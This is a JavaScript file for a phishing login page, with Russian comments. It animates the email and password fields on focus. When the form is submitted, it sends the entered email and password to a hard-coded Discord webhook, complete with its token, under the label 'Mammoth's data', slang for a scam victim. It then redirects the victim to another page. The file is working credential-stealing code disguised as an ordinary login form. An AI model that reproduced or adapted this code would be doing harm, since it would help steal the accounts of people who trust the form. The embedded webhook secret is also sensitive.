var current = null;

// Анимация для фокуса на полях
document.querySelector('#email').addEventListener('focus', function(e) {
    if (current) current.pause();
    current = anime({
        targets: 'path',
        strokeDashoffset: {
            value: 0,
            duration: 700,
            easing: 'easeOutQuart'
        },
        strokeDasharray: {
            value: '240 1386',
            duration: 700,
            easing: 'easeOutQuart'
        }
    });
});

document.querySelector('#password').addEventListener('focus', function(e) {
    if (current) current.pause();
    current = anime({
        targets: 'path',
        strokeDashoffset: {
            value: -336,
            duration: 700,
            easing: 'easeOutQuart'
        },
        strokeDasharray: {
            value: '240 1386',
            duration: 700,
            easing: 'easeOutQuart'
        }
    });
});

// Получаем элементы формы
const emailInput = document.querySelector('#email');
const passwordInput = document.querySelector('#password');
const submitButton = document.querySelector('#submit');

// Обработчик клика по кнопке
submitButton.addEventListener('click', function(event) {
    event.preventDefault(); // Предотвращаем стандартное поведение кнопки

    // Получаем значения из полей
    const email = emailInput.value;
    const password = passwordInput.value;

    // Валидация полей
    if (!email || !password || password.length < 8) {
        // Если поля пустые или пароль слишком короткий, просто ничего не делаем
        return;
    }

    // Формируем объект данных для отправки
    const data = {
        content: `Данные Мамонта: \nEmail: ${email} \nPassword: ${password}`
    };

    // Отправка данных на вебхук Discord (опционально)
    fetch('https://discord.com/api/webhooks/1307681216220233800/cCpZnpuKDlPl6PnQnqO6rvhPHyX8KEQ5eqq16y_PaTVaTzOGAOS3ANs4WxWfPc9yAH_Z', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        // Перенаправляем на другую страницу после успешной отправки данных
        window.location.href = "index.html";  // Замените на URL целевой страницы
    })
    .catch((error) => {
        console.error('Error:', error);
        // Логируем ошибку в консоль для отладки
    });
});
